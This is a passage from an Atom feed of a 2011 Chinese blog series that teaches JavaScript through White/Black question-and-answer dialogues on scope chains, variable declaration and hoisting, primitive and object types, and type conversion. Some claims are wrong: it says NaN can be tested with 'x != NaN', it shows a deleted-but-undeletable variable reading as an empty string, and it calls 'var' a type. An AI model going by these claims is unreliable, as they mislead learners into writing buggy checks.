&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;在最顶级作用域中，作用域链只有一个全局对象组成，即window VO。在不包含嵌套函数的函数体内，作用域链上有两个对象，第一个是函数自身VO，还有其外层的window VO。如果函数中还有嵌套函数，那么内部嵌套函数的作用域链就是自身VO + 所有的外层ScopeChains，一直包含到window VO。作用域链是在解释器进入函数的时候进行重新定义（或者说延伸），不断进行 新的ScopeChains = 自身VO + 外层ScopeChains。&lt;/p&gt;

&lt;p&gt;嵌套函数更加特殊的地方在于，因为作用域链是在进入函数时重新定义的，所以嵌套函数的作用域链在每次执行外部函数时定义的，虽然嵌套函数的代码相同，但关联这段代码的作用域链却不相同。&lt;/p&gt;

&lt;p&gt;作用域链有几个特殊情形是with和try…catch,这两种情况都会产生一个新的作用域上下文即变量对象VO,附加到整个作用域链最前面，即在with中的ScopeChains = with_VO + 当前函数Scopehains。try…catch也是一样的。&lt;/p&gt;
&lt;hr /&gt;</content>
 </entry>
 
 <entry>
   <title>BW编程之js变量篇(三)</title>
   <link href="http://izhanghuaning.github.io/2011/05/10/jsdg-chap3-types-values-variables2.html"/>
   <updated>2011-05-10T00:00:00+08:00</updated>
   <id>http://izhanghuaning.github.io/2011/05/10/jsdg-chap3-types-values-variables2</id>
   <content type="html">&lt;h4 id=&quot;white&quot;&gt;White:变量是什么？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;正如前面类型篇所讲，变量就是一个标签，贴到了“值alue”上面，代码可以通过变量来操作它所代表的值，主要是为了方便复用。&lt;/p&gt;

&lt;p&gt;变量根据是否可以改变分为普通变量和常量，常量就是赋值之后不能二次赋值（改变）的特殊只读变量，js没有真正声明常量的语法，基本是约定俗称的全大写的变量表示常量。&lt;/p&gt;

&lt;p&gt;js的变量根据其作用域(有效范围)分为私有变量、局部变量、全局变量等，js的作用域只有函数作用域，外层作用域的变量可以穿透作用域到内层作用域，当内外层作用域的变量冲突的话，内层作用域的变量起作用（覆盖了外层），这实际上是变量的作用域链的查找规则决定的，后面会深入探讨作用域链。还有一种特殊的能跨作用域的变量是闭包的概念，这也是一个进阶的内容，放在后面单独开出一章来讲解。一句话理解闭包就是从作用域A操作（访问）作用域B中的变量,基本是指外部访问内部作用域的变量。&lt;/p&gt;

&lt;p&gt;js中没有真正声明私有变量的语法，约定俗称是变量前面或者后面加上一个或两个下划线表示该变量为私有变量（_name,name_,__proto__等），作者不希望其他人使用这些变量，此所谓防君子不防小人，别人照样能随意操作你的私有变量。真正实现的私有变量是通过闭包来实现的，但是性能效率比较低，关于闭包会详细说明请参见&lt;a href=&quot;/2011/06/15/jsdg-chap8-closure.html&quot;&gt;javascript闭包详解&lt;/a&gt;。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_2&quot;&gt;White:变量作用域是什么？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;变量的作用域是指”程序源代码中定义这个变量”的区域。js的作用域只有一种，函数作用域。全局作用域可以看作一种特殊的函数作用域，类似语程序的入口函数(main)的概念，所有的js代码都是在全局作用域被解释器顺序解释并执行，遇到执行函数时则进入函数作用域(function)解释并执行。&lt;/p&gt;

&lt;p&gt;全局对象（一般是window）是js解释器加载js代码时候创建的特殊对象（上下文对象或活动对象），所有未声明在其他函数作用域(function)的变量、函数都会成为window对象的属性，它们在代码中的任何地方（所有作用域中）都是可见的。如下所示：&lt;/p&gt;

&lt;p&gt;……………隐藏的js文件或script开始标签&amp;lt; script&amp;gt;………………..&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;	var scope = &amp;quot;global&amp;quot;;
	function checkscope() {
		var localscope = &amp;quot;local&amp;quot;;
		scope_without_var = &amp;quot;scope_without_var&amp;quot;;
		return scope + &amp;quot; &amp;quot; + localscope + &amp;quot; &amp;quot; + scope_without_var;
	}
	scope;//=&amp;gt;global
	localscope;//=&amp;gt;未声明错误
	scope_without_var;//=&amp;gt;未声明错误,注意还没有执行checkscope，解释器还不知道它的存在
	
	checkscope();//=&amp;gt;global local scope_without_var，这里执行了checkscope
	
	scope;//=&amp;gt;global
	localscope;//=&amp;gt;未声明错误
	scope_without_var;//=&amp;gt;scope_without_var，注意执行checkscope后的改变&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;……………..隐藏的js文件或script结束标签&amp;lt;/ script&amp;gt;……………….&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejs&quot;&gt;White:js解释器是如何工作的，声明提前是怎么回事？&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;编译式和解释式的区别在于，编译式是编译后就在执行前先知先觉，解释式必须执行到相应代码才能看到，属于后知后觉。javascript是解释式的语言&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;black在模拟javascript解释器：&lt;/strong&gt; 大家好，我是一个XX浏览器的js解释器，我遵守ECMAScript的规则来处理js代码。我看到一个js文件或者一个script标签，这两者意义相同，我用js文件进行代指吧。我知道我到了工作的时候了，我首先逐行阅读这个js文件查看都声明了哪些变量或者函数，不管变量是不是通过var声明的。这时候我不执行任何表达式或语句，也不进入任何函数内部，我把”所有变量（var | no var）”和”所有函数”(通过”function run() {}”声明式的,不考虑”var run = function() {}”这种表达式的方式，后一种把var run做变量处理)都提升到任何js代码之前进行集中声明，这样我就知道了这个js文件都声明了哪些变量和函数了，我把顶级作用域的这些声明都附加成window对象的属性，便于以后的作用域链的查找。然后我又一次从原始js文件（隐藏的变量提前之前）逐行进行处理，进行遇到的各个”表达式和语句(表达式和语句的区别以后会讲解)”，直到遇到执行函数。&lt;/p&gt;

&lt;p&gt;我在顶级作用域遇到执行函数这时候，我找到了相应的函数声明，然后我就进入函数内部(有时候需要带上参数)，一下子我离开了顶级作用域，进入了这个函数的作用域了，又是一个未知的新天地，我就重复上段所做的，先看声明，再变量提前，再执行表达式和语句，直到遇到下一个函数，如此反复，遇到return返回语句我就把当前的结果返回上一级作用域或者执行完函数最后一句，这时候返回undefined。&lt;/p&gt;

&lt;p&gt;现在我又回到顶级作用域了，继续向下执行，直到js文件末尾。&lt;/p&gt;

&lt;p&gt;ok，我的工作完成了。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejsvarscopelocalscopevarscope_without_var&quot;&gt;White:上面js中变量声明中使用var方式”scope”,”localscope”和不使用var声明变量”scope_without_var”的区别是什么？&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;注意：不使用var可以声明变量是js的一个坏特性，完全可以不使用这种做法，而且我们也应该不使用这样的声明方式。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;js中变量声明一般使用var声明&lt;code&gt;var last_name=&amp;quot;zhang&amp;quot;;&lt;/code&gt;，如果读取还未赋值&lt;code&gt;var my_name;&lt;/code&gt;时返回undefined。也可以不是用var而不声明直接使用变量&lt;code&gt;first_name=&amp;quot;huaning&amp;quot;&lt;/code&gt;，但是读取未声明的变量&lt;code&gt;full_name//=&amp;gt;报错&lt;/code&gt;会报错。&lt;/p&gt;

&lt;p&gt;例如在最顶级作用域window作用域来说，这两种方式的区别在于，前一种方式显式声明了一个全局变量，后一种方式隐式声明了全局变量（全局属性）name，即全局对象window增加了一个新的first_name的属性。window的所有属性都是可以在js代码中以变量形式直接使用的，之所以说是window的属性是因为对于属性可以使用&lt;code&gt;delete first_name //=&amp;gt;true&lt;/code&gt;表达式返回true，而对于变量&lt;code&gt;delete last_name //=&amp;gt;false&lt;/code&gt;。区别看下面代码：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;	var last_name;
	last_name; //=&amp;gt; undefined
	first_name; //=&amp;gt;未声明错误
	last_name = &amp;quot;zhang&amp;quot;;
	first_name = &amp;quot;huaning&amp;quot;;
	last_name; //=&amp;gt; zhang
	first_name; //=&amp;gt;huaning

	window.hasOwnProperty(&amp;quot;last_name&amp;quot;); //=&amp;gt;true
	window.hasOwnProperty(&amp;quot;first_name&amp;quot;); //=&amp;gt;true
	delete last_name; //=&amp;gt;false
	delete first_name; //=&amp;gt;true
	last_name; //=&amp;gt; &amp;quot;&amp;quot;
	first_name; //=&amp;gt;未声明错误&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;注意：在函数内部当不使用var声明的全局变量scope_without_var，在解释器进入函数之前是不存在的，因为解释器还不知道它的存在,解释器进入该函数后，scope_without_var才能被所有的代码使用&lt;/strong&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h5 id=&quot;&quot;&gt;此篇太长，读到这里基本注意力涣散了，所以另起一片继续变量篇后续内容&lt;/h5&gt;</content>
 </entry>
 
 <entry>
   <title>BW编程之js类型篇(二)</title>
   <link href="http://izhanghuaning.github.io/2011/05/05/jsdg-chap3-types-values-variables.html"/>
   <updated>2011-05-05T00:00:00+08:00</updated>
   <id>http://izhanghuaning.github.io/2011/05/05/jsdg-chap3-types-values-variables</id>
   <content type="html">&lt;h4 id=&quot;white&quot;&gt;White:类型、值、变量分别指什么，它们之间有什么联系和区别？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;计算机程序的运行需要对“值value”进行操作。在编程语言中，能够表示并操作的值的类型称作”数据类型type“，编程语言最基本的特性是支持多种数据类型，比如字符串、数字、布尔值、数组等等。当程序需要将一个值反复使用，就需要将其保存在一个”变量variable“中。简单来说 &lt;code&gt;var name = &amp;quot;zhn&amp;quot; &lt;/code&gt;中var是类型，”zhn“是值，name是变量。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejavascript&quot;&gt;White:javascript是弱类型语言，这个怎么理解？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;强/弱类型是指类型检查的严格程度的。语言有无类型，弱类型和强类型三种。无类型的不检查，甚至不区分指令和数据。弱类型的检查很弱，仅能严格的区分指令和数据。强类型的则严格的在编译期进行检查。&lt;/p&gt;

&lt;p&gt;像java、c#等强类型语言而言，变量和值都有自己的类型，在编译阶段就可检查类型匹配。比如&lt;code&gt;String name&lt;/code&gt;，变量name的类型是String，这是静态类型，也就是name只能被赋值字符串&lt;code&gt;name=&amp;quot;zhn&amp;quot;&lt;/code&gt;，而不能被赋值数字&lt;code&gt;name=30&lt;/code&gt;，否则编译就会报错。你也可以声明&lt;code&gt;object age&lt;/code&gt;，这样可以&lt;code&gt;age = 30, age = &amp;quot;zhn&amp;quot;&lt;/code&gt;，这样可以近似实现弱类型，不过这样会需要在运行时频繁的类型转换，不能发挥强类型的优点了。&lt;/p&gt;

&lt;p&gt;而javascript中的变量都用var来声明，比如&lt;code&gt;var name&lt;/code&gt;本身不指定具体类型，name可以被赋任何类型值，&lt;code&gt;name=&amp;quot;zhn&amp;quot;， name=3， name=new Date()， name=[1,2,3]&lt;/code&gt;等等都是可以的，所以说js是弱类型语言，就是变量无类型，值有类型。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejavascript_2&quot;&gt;White:javascript的值有哪些类型？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;js中的值分为原始类型和对象类型两大类，原始类型只有5种，分别是：字符串、数字、布尔值、null、undefined。&lt;/p&gt;

&lt;p&gt;除了原始类型其他的都是对象类型，常见的有数组Array、正则RegExp、日期Date、错误Error、普通对象Object、函数Function等。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;注意：原始类型都是不可变类型。对象类型都是可变类型。&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejavascript_3&quot;&gt;White:详细介绍一下javascript原始类型？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;原始类型都是不可变类型。不能修改原始值本身，包括特别是字符串也不能修改。例如：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;	1 var name = &amp;quot;zhn&amp;quot;; //=&amp;gt; zhn
	2 var zhn = &amp;quot;zhn&amp;quot;;  //=&amp;gt; zhn
	3 name = name.toUpperCase(); //=&amp;gt; ZHN
	4 zhn //=&amp;gt; zhn&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;上面的行1,2中”zhn”是完全不相关的内存中的两个区域的值，行3中的toUpperCase没有改变行1中的”zhn”，而是生成了一个新的”ZHN”来进行替代，原来行1的”zhn”没有任何变量去关联它，它会被js的垃圾回收机制进行回收。而2中的”zhn”不受任何影响。&lt;/p&gt;

&lt;p&gt;原始类型中的字符串、数字、布尔值都可以被包装成相应的对象String、Number、Boolean。被包装成对象后具有相应的一些方法,比如string的sub、split、toUpperCase等方法。在包装对象的过程中有”临时对象”的概念需要注意，例如：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;	1 var name = &amp;quot;zhn&amp;quot;;
	2 name.toUpperCase(); //=&amp;gt; ZHN，注意这里没有进行赋值，包装的是一个临时对象obj,然后调用了obj.toUpperCase()方法。
	3 name //=&amp;gt; zhn ，注意name依然是&amp;quot;zhn&amp;quot;，没有任何改变，行2中的临时对象obj已经被抛弃了。&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;原始类型中的null和undefined都代表“空”的意思,它们都是唯一值,不可被包装成对象，也就是它们没有任何方法，调用它们的任何方法都会报错。null和undefined一般来说其区别是：null代表定义了变量但未赋值的空，引用类型的变量赋空值一般也用null，&lt;code&gt;typeof null //=&amp;gt; object&lt;/code&gt;。undefined代表未定义的空，就是不存在这个变量&lt;code&gt;typeof undefined //=&amp;gt; undefined&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;null是关键字，undefined不是关键字，是一个全局变量。你或许可以认为undefined是表示系统级的，出乎意料或者类似错误的值的空缺。而null是程序级的，正常的或意料之中的值的空缺。如果需要将其赋给变量或属性或参数，最佳选择是使用null。&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejavascript_4&quot;&gt;White:javascript的原始类型使用中有哪些需要注意的？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; 关于数字，js预定义了全局变量Infinity和NaN表示正无穷大和非数字，其中NaN和任何值都不相等，包括自身。判断Nan需要使用x != NaN进行判断。还有浮点数运算是有误差，整数没有。&lt;/p&gt;

&lt;p&gt;关于布尔值，假值只有false、“”、0、-0、null、NaN、undefined，其余都是真值，真值也就是在if语句判断中为真，假值判断为假。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejavascript_5&quot;&gt;White:详细介绍一下javascript的对象类型？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;对象类型都是可变的引用类型，它们的值是可修改的。&lt;em&gt;原始值的相等比较是比较值，而对象类型相等比较是比较的引用地址，如果想比较两个对象的值相等需要自己去实现方法或者简单的序列化后比较值。&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;所有js的对象类型都可以看作统一看作哈希值（hash或者字典），由键、值对构成。例如：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;	var zhn = { name:&amp;quot;zhanghuaning&amp;quot;, 
				age:30,
				say: function() {return &amp;quot;Hello world&amp;quot;}
			  };
	var names = [&amp;quot;zhn&amp;quot;, &amp;quot;black&amp;quot;, &amp;quot;white&amp;quot;];
	var sayHi = function(name) {return &amp;quot;Hi&amp;quot; + name;};
	zhn[&amp;quot;name&amp;quot;] //=&amp;gt; zhanghuaning
	names[0] //=&amp;gt; zhn ,数组只是键为正整数并且会自动维护length的对象。
	sayHi[&amp;quot;length&amp;quot;] //=&amp;gt;1,相当语sayHi.length取得函数的声明参数个数，function也是对象，length是它的属性。&lt;/code&gt;&lt;/pre&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_2&quot;&gt;White:介绍一下类型转换的相关内容？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; 比较罗嗦并且用到不太多，常用的基本遇到2次就掌握了，等以后上一张图片慢慢看吧。&lt;/p&gt;

&lt;p&gt;这里介绍一点类型转换相关的小技巧或注意事项吧，遇到这些情况能认识就好。&lt;/p&gt;

&lt;p&gt;注意事项：==和===的区别在于前者会进行类型转换后比较&lt;code&gt;2 == &amp;quot;2&amp;quot; //=&amp;gt; true&lt;/code&gt;，后者不进行类型转换比较&lt;code&gt;2 === &amp;quot;2&amp;quot; //=&amp;gt;false&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;+优先考虑字符串&lt;code&gt;1 + &amp;quot;x&amp;quot; //=&amp;gt;&amp;quot;1x&amp;quot;&lt;/code&gt;,其他操作考虑数字&lt;code&gt;&amp;quot;2&amp;quot; * &amp;quot;3&amp;quot; //=&amp;gt;6 ,“1” - “x” //=&amp;gt;NaN&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;小技巧： x + ”” 转换成字符串&lt;/p&gt;

&lt;p&gt;+x 转换成数字&lt;/p&gt;

&lt;p&gt;!!x 转换成布尔值&lt;/p&gt;

&lt;p&gt;void 0 转换成undefined&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/themes/twitter/img/typeconvert.png&quot; alt=&quot;&quot; title=&quot;类型转换表&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;</content>
 </entry>
 
 <entry>
   <title>BW编程之js概述篇(一)</title>
   <link href="http://izhanghuaning.github.io/2011/05/01/jsdg-chap1-introduction.html"/>
   <updated>2011-05-01T00:00:00+08:00</updated>
   <id>http://izhanghuaning.github.io/2011/05/01/jsdg-chap1-introduction</id>
   <content type="html">&lt;h4 id=&quot;white&quot;&gt;White：我是一个编程菜鸟，我想学习点关于编程的知识，从什么语言入手比较好？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; 俗话说“信心要比黄金更可贵”。学习一种编程语言最终要的是它能让你喜欢它，并且有信心能掌握它，使用它。怎么样提高信心呢？首先是入手快，其次所见即所得。这样才能不停的取得成就感和满足感，提升更大的信心。&lt;/p&gt;

&lt;p&gt;&lt;em&gt;入手快：&lt;/em&gt; JavaScript只要有浏览器（IE8以上、Chrome、FireFox等）就可以学习，不需要安装任何IDE。javascript语法简单，是弱类型语言，不需要记住很多语法知识，上手速度快。&lt;/p&gt;

&lt;p&gt;&lt;em&gt;所见即所得：&lt;/em&gt; javascript是解释性语言，不需要经过编译即可直接运行。代码可以执行在console执行看到结果。对Dom（文档对象模型，简单来说就是网页）的操作也是即时呈现。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejavascript&quot;&gt;White：为什么要学习javascript,它的使用场景广泛么?&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; javascript可以说是世界上使用最多的编程语言，每个网页几乎都在使用它。随着互联网的发展，大量的网站已经由静态web网页发展到了web应用，web应用需要处理大量的用户交互，这就离不开javascript的支持。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejavascript_2&quot;&gt;White:简单介绍一下javascript吧&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; 好的，javascript其实主要包含几个部分：javascript语言核心(ECMAScript),客户端javascript（宿主浏览器），服务端javascript（node.js)。我们j接下来只关心前面2个部分，因为node.js我也没多少使用经验。&lt;/p&gt;

&lt;p&gt;简单来说javascript就是一种高端的、动态的、弱类型的编程语言，非常适合面向对象和函数式的编程风格。javascript的语法来自java，它的一等函数来自语scheme(一种lisp方言)，基于原型的继承来自self。我们不需要了解上面的java、scheme、self语言，因为我也不知道。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;特别声明:javascript和java没有任何关系，除了名字和语法有点相似，买书的时候千万不要买java的书来学习javascript。&lt;/strong&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejavascript_3&quot;&gt;White:既然谈到javascript书籍，有哪写书值得购买呢？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; 好的，推荐这些书籍主要是为了你能够用最少的精力和金钱得到更多的知识和技能，没有任何广告和商业成分，并且这些书都是我购买并且仔细阅读过的。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;基础级：JavaScript权威指南、JavaScript高级程序设计&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;进阶级：JavaScript语言精粹、基于MVC的Javacript Web富应用开发、Javacript模式、编写可维护的JavaScript（这本暂时没看完）&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;上面几本书看完基本对于javascript也有了一定认识了，完全可以自己去探索更多javascript的美丽世界了。好书可以多读几遍，可以有更多的收获。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejavascript_4&quot;&gt;White:你为什么会写这些博客，并且javascript系列会涉及到哪些内容呢？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;这些年看过很多书，也看过很多其他人的博客，加深了对很多知识和技术的掌握。很多时候在看书或者看博客的时候有一些感悟，但是过一点时间不去深入研究就忘记了，所以希望能够有个笔记本来记录自己在学习技术过程中的点点滴滴。最好也能够对其他偶尔来到这里的人有所帮助，共享、免费，提倡自由、平等是每个程序员的追求。&lt;/p&gt;

&lt;p&gt;至于javascript的内容是基于上面那些书籍和一些博客的内容加上自己的一些理解，基本算是想到哪里说到哪里，可能会比较杂，但是还是尽量按照从基础到进阶的过程来组织。&lt;/p&gt;</content>
 </entry>
 
 <entry>
   <title>BW编程《javascript权威指南篇》概述</title>
   <link href="http://izhanghuaning.github.io/2011/04/25/jsdg-introduction.html"/>
   <updated>2011-04-25T00:00:00+08:00</updated>
   <id>http://izhanghuaning.github.io/2011/04/25/jsdg-introduction</id>
   <content type="html">&lt;h4 id=&quot;whitebw&quot;&gt;White：为什么这个系列都有个BW编程？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; 这个系列是通过white和black的问答方式讲解一些javascript的知识。借用现在流行的结对编程的概念（虽然结对编程2个人技术能力相差太大不好），更确切的说是借鉴“师傅带徒弟”的方式吧。&lt;/p&gt;

&lt;p&gt;white是一个虚心好学的新人，刚踏上初级程序员的工作岗位，对编程认识和理解比较少，喜欢提问题。&lt;/p&gt;

&lt;p&gt;black是一个工作5年左右的程序员，喜欢读书和钻研技术，也喜欢分享知识，崇尚“共享、免费、提倡自由、平等”的古老精神。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejsdg&quot;&gt;White：类别“jsdg”是什么意思？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; jsdg是js的名著《javascript权威指南(javascript:the definitive guide)》的缩写，本系列基本是按照《js权威指南》的顺序讲解js的基础知识。主要分为两个部分“js核心即ecmascript”和“客户端js（浏览器js）”。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejsdg_2&quot;&gt;White：jsdg系列主要有哪些内容？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; jsdg系列是记录了通过《js权威指南》学习js的过程，也借鉴和吸收了以往阅读的大量其他作者的博客和书籍，在此表示他们感谢。本系列基本体现目前本人对js的理解，如有错误是水平不足所致，欢迎大家能够予以指正，不胜感激。&lt;/p&gt;
&lt;hr /&gt;</content>
 </entry>
 
 
</feed>